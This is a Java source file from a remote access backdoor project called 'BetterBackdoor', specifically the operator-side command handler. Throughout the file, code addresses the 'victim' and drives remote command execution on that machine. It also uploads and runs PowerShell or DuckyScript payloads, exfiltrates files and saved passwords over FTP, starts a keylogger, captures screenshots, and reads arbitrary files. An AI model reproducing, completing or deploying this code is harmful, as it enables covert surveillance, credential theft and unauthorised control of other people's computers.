package com.thatcherdev.betterbackdoor.shell;

import java.io.File;
import java.io.IOException;

import com.thatcherdev.betterbackdoor.BetterBackdoor;
import com.thatcherdev.betterbackdoor.backend.FTP;
import com.thatcherdev.betterbackdoor.backend.Utils;

import org.apache.commons.io.FileUtils;

public class HandleCommand {

	/**
	 * Handles command {@link command} given by user.
	 *
	 * @param command command given by user
	 * @throws IOException
	 */
	public static void handle(String command) throws IOException {
		if (command.equals("cmd")) {
			System.out.println(
					"Commands will now be executed through vitim's computer's Command Prompt\nEnter 'back' to go back");
			while (true) {
				System.out.print("cmd");
				String cmdCommand = BetterBackdoor.getInput("");
				if (cmdCommand.equals("back"))
					break;
				Shell.out.println("cmd " + cmdCommand);
				System.out.println(getResp());
			}
		} else if (command.equals("ps") || command.equals("ds")) {
			System.out.print("This will send a local ");
			if (command.equals("ps"))
				System.out.print("PowerShell script ");
			else
				System.out.print("DuckyScript");
			System.out.println(" to the victims computer, execute it, and delete it.");
			System.out.println("Enter local filepath of script:");
			File file = new File(BetterBackdoor.getInput("file"));
			System.out.println("Sending script...");
			Shell.out.println("filesend " + file.getName());
			FTP.shell(file.getAbsolutePath(), "send");
			System.out.println(getResp());
			System.out.println("Running script...");
			Shell.out.println(command + " " + file.getName());
			System.out.println(getResp());
		} else if (command.equals("exfiles")) {
			System.out.println(
					"This will copy files with desired extensions from a folder and all it's subfolders to a ZIP file, send the ZIP file to this computer, and delete the original ZIP file from the victim's computer.");
			System.out.println("Enter victim's directory to search through:");
			String root = BetterBackdoor.getInput("");
			Shell.out.println("filetype " + root);
			String filetype = getResp();
			if (filetype.equals("file")) {
				System.out.println("You entered a file. Invalid input.");
			} else if (filetype.equals("not real")) {
				System.out.println("No such directory");
			} else {
				System.out.println("Enter extensions of files separated by commas (i.e. txt,pdf,docx)");
				String exts = BetterBackdoor.getInput("");
				Shell.out.println("exfiles " + root + "*" + exts);
				System.out.println("Receiving files to '" + System.getProperty("user.dir") + File.separator + "gathered"
						+ File.separator + "ExfiltartedFiles.zip'...");
				FTP.shell("gathered" + File.separator + "ExfiltratedFiles.zip", "rec");
				System.out.println(getResp());
			}
		} else if (command.equals("expass")) {
			Shell.out.println("expass");
			System.out.println("Receiving passwords to '" + System.getProperty("user.dir") + File.separator + "gathered"
					+ File.separator + "ExfiltratedPasswords.zip'...");
			FTP.shell("gathered" + File.separator + "ExfiltratedPasswords.zip", "rec");
			System.out.println(getResp());
		} else if (command.equals("filesend")) {
			System.out.println("Enter local filepath of file to send:");
			String fileSend = BetterBackdoor.getInput("file");

			File file = new File(fileSend);
			if (file.isFile())
				System.out.println("Enter victim's filepath of file to receive:");
			else if (file.isDirectory()) {
				System.out.println("You entered a directory. It will be compressed and then sent.");
				System.out.println("Enter victim's filepath of ZIP file to receive:");
			} else
				System.out.println("No such file or directory");

			if (file.exists()) {
				String fileRec = BetterBackdoor.getInput("");
				Shell.out.println("filesend " + fileRec);
				if (file.isDirectory()) {
					Utils.zipDir(file.getAbsolutePath());
					FTP.shell(file.getAbsolutePath() + ".zip", "send");
				} else
					FTP.shell(file.getAbsolutePath(), "send");
				System.out.println(getResp());
				if (file.isDirectory())
					FileUtils.forceDelete(new File(file.getAbsolutePath() + ".zip"));
			}
		} else if (command.equals("filerec")) {
			System.out.println("Enter victim's filepath of file to send:");
			String fileSend = BetterBackdoor.getInput("");

			Shell.out.println("filetype " + fileSend);
			String filetype = getResp();
			if (filetype.equals("file"))
				System.out.println("Enter local filepath of file to receive:");
			else if (filetype.equals("directory")) {
				System.out.println("You entered a directory. It will be compressed and then received.");
				System.out.println("Enter local filepath of ZIP file to receive:");
			} else
				System.out.println("No such file or directory");

			if (!filetype.equals("not real")) {
				String fileRec = BetterBackdoor.getInput("");
				Shell.out.println("filerec " + fileSend);
				FTP.shell(fileRec, "rec");
				System.out.println(getResp());
			}
		} else if (command.equals("keylog")) {
			Shell.out.println("cmd echo %CD:~0,2%");
			String currentDrive = getResp();
			Shell.out.println("cmd echo %USERNAME%");
			String currentUser = getResp();

			String logFileDir = "C:\\Users\\" + currentUser + "\\AppData\\Gathered";
			if (!currentDrive.equals("C:")) {
				System.out.println("The backdoor is running from drive " + currentDrive.substring(0, 1)
						+ ". Where should keys be logged?");
				System.out.println("[0] " + logFileDir + "\\keys.log");
				System.out.println("[1] " + currentDrive + "\\keys.log");
				String dirChoice = BetterBackdoor.getInput("op01");
				if (dirChoice.equals("1"))
					logFileDir = currentDrive;
			}
			Shell.out.println("keylog " + logFileDir);
			System.out.println(getResp());
		} else if (command.equals("ss")) {
			Shell.out.println("ss");
			System.out.println("Receiving screenshot to '" + System.getProperty("user.dir") + File.separator
					+ "gathered" + File.separator + "screenshot.png'...");
			FTP.shell("gathered" + File.separator + "screenshot.png", "rec");
			System.out.println(getResp());
		} else if (command.equals("cat")) {
			System.out.println("Enter victim's filepath of file to get contents of:");
			Shell.out.println("cat " + BetterBackdoor.getInput(""));
			System.out.println(getResp());
		} else if (command.equals("zip")) {
			System.out.println("Enter victim's filepath of directory to compress:");
			Shell.out.println("zip " + BetterBackdoor.getInput(""));
			System.out.println(getResp());
		} else if (command.equals("unzip")) {
			System.out.println("Enter victim's filepath of ZIP file to decompress:");
			Shell.out.println("unzip " + BetterBackdoor.getInput(""));
			System.out.println(getResp());
		} else if (command.equals("exit"))
			System.exit(0);
		else {
			Shell.out.println(command);
			System.out.println(getResp());
		}
	}

	/**
	 * Gets response from client.
	 *
	 * @return response from client
	 */
	private static String getResp() {
		String resp = "";
		while (Shell.in.hasNextLine()) {
			String line = Shell.in.nextLine();
			if (line.equals("!$end$!"))
				break;
			resp += line + "\n";
		}
		return resp.substring(0, resp.length() - 1);
	}
}